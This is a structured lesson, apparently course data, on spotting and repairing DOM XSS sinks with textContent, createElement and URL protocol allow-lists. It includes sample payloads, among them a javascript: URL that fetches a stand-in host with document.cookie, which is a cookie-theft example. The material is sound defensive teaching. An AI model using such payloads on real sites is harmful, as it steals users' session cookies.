canonicalExplanation.summary: **DOM XSS** happens when untrusted data (a comment, a URL parameter, a server field) reaches a **sink**: a place where the browser treats text as code or markup. Common sinks are `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `setTimeout("string")`, and `href`/`src` attributes that accept `javascript:` URLs. The fix depends on the **context**: use `textContent` for text, validated `URL` objects for links, and `setAttribute` with fixed names for attributes. Stripping `<` and `>` is not enough, because URL and attribute sinks need no angle brackets at all.

sections.heading: Start here
sections.body:
A lesson discussion shows comments with `` list.innerHTML += `
  • ${comment.text}
    • ` ``. Someone posts ``, and every reader's browser runs it. A comment is assigned with textContent rather than concatenated into innerHTML. In this lesson you'll identify and repair DOM XSS sinks using safe text or constrained APIs. ```predict {"question": "A profile link does `a.href = user.website` after removing every `<` and `>`. The website is `javascript:alert(document.cookie)`. Safe?", "options": ["Yes, there are no tags", "No: href runs javascript: URLs without any angle brackets"], "answer": 1, "why": "URL sinks need a protocol check, not tag stripping."} ```

sections.heading: Before you begin
sections.body: You should know the **DOM, events and forms** module, the **Promises, async work and HTTP** module, **Query and update DOM** (textContent vs innerHTML), and **Fetch and HTTP responses**, since server data is untrusted too.

sections.heading: The rule: match the handling to the sink
Spot the sink

includes: Identify HTML, URL, attribute and script sinks.
Repair them with textContent, URL validation and fixed attribute names.

outcomes: Identify and repair DOM XSS sinks using safe text or constrained APIs.

examples.title: The comment that ran a script
examples.situation: A comment is assigned with textContent rather than concatenated into innerHTML in the lesson discussion.
walkthrough: **Find the sink:** `list.innerHTML += ...` parses comment.text as HTML, so the img onerror runs.
**Repair:** create the li and p with createElement and set `body.textContent = comment.text`.
**Test:** rendering the malicious comment will show its characters literally, and a test checks that no img element was created.
examples.result: The discussion shows every comment exactly as written, and no comment can run code in a reader's browser.

examples.title: The profile link that ran code
examples.situation: Author names link to their website with `author.href = comment.authorWebsite`. One author sets their website to `javascript:fetch('//evil.example?c='+document.cookie)`.
walkthrough: href is a URL sink that runs javascript: URLs when clicked.
Removing angle brackets does nothing here.
Fix: parse with new URL and allow only http: and https:, otherwise leave the link off.
examples.result: Only real web links become clickable, and javascript: URLs are ignored.

misconceptions.mistakenBelief: Replacing angle brackets is enough to make untrusted text safe in every DOM sink.
misconceptions.correction: Each sink has its own context. URL sinks run javascript: links, attribute sinks can add event handlers, and script sinks run strings directly. Use the safe API for the context instead of one filter.
misconceptions.diagnosticPrompt: In "The profile link that ran code", why didn't stripping < and > help?

analogy.example: Sinks are like **different machines in a kitchen**. Text is harmless on a plate (textContent), but put the same ingredient in the oven (innerHTML) or the blender (eval) and it gets processed. Safety means knowing which machine you're feeding and using the right guard for it.
limitations: Kitchen machines don't read instructions; the HTML parser does.
A label check (URL protocol) is its own guard, not a filter for all machines.

steps.explanation: The comment arrives from the server as untrusted data.
The comment is assigned with textContent rather than concatenated into innerHTML.
The malicious markup shows as characters and never runs.

trace.textAlternative: Rendering a hostile comment safely. Step 1, Untrusted data: comment.text is contains an img tag. The comment arrives from the server as untrusted data. Step 2, Safe sink: parser used is none; p text is . The comment is assigned with textContent rather than concatenated into innerHTML. Step 3, Result: img elements created is 0; script run is no. The malicious markup shows as characters and never runs.

faded.prompt: For "The comment that ran a script", explain why a comment is assigned with textContent rather than concatenated into innerHTML.
expectedEvidence: Names the example "The comment that ran a script": innerHTML was the sink.
The comment is assigned with textContent.
No img element or script is created.
The discussion shows every comment exactly as written.

nearTransfer.prompt: Review five lines and mark each safe or unsafe: `el.textContent = q`, `el.innerHTML = q`, `a.href = q`, `img.src = new URL(q, location.origin).href` after an https check, `setTimeout(q, 10)`.
scaffold: Name the sink context for each.
expectedEvidence: Safe: textContent and the checked img src.
Unsafe: innerHTML, raw href and setTimeout with a string.

farTransfer.prompt: Audit a small page with search, comments and profile links. List every sink, repair each with a context-appropriate API, and add tests with XSS payloads for HTML and URL contexts.
scaffold: Search for innerHTML, href, src, eval.
Use known payload strings in tests.
expectedEvidence: Tests prove payloads render as text or are rejected.

remediation.explanation: For each place data enters the DOM ask: **Is this a text, HTML, URL, attribute or script context?** Then use the matching safe API. If the answer is "HTML from a user", stop and use a sanitiser.
remediation.retryPrompt: Apply this to "The profile link that ran code".

recap.summary: To identify and repair DOM XSS sinks, find where untrusted data reaches HTML, URL, attribute or script contexts, and use safe text with textContent and createElement, validated URL objects with a protocol allow-list, fixed attribute names, and functions instead of code strings.
retrievalPrompts: What's the safe way to show user text?
How do you make a user-supplied link safe?
